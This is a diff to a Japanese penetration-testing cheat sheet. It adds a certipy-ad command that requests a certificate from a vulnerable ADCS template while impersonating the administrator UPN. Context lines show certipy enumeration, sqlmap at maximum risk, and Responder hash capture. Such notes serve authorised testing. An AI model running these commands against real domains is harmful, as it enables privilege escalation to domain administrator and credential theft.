@@ -75,6 +75,7 @@ ADCSの脆弱性を調査、列挙、および悪用するために設計され�
 ```bash
 certipy-ad find -u <User>@<Target> -hashes :<NTLM hash> -stdout -vulnerable
 certipy-ad find -u '<User>@<Target>' -p '<password>' -target <Target> -dc-ip <Target> -stdout -vulnerable
+certipy-ad req -u '<User>@<Target>' -p '<password>' -dc-ip <Target -ca '<CA Name>' -template '<Template name>' -upn 'administrator@<Domain>'
 ```
 
 # Procdump
@@ -296,6 +297,7 @@ sqlmap -u "<Target>" --data "<Parameters>" --level 3 --risk 3 --batch --dbms "<D
 sudo responder -I tun0
 cat /usr/share/responder/logs/Responder-Session.log # 取得したハッシュ履歴
 ```
+
 
 
 
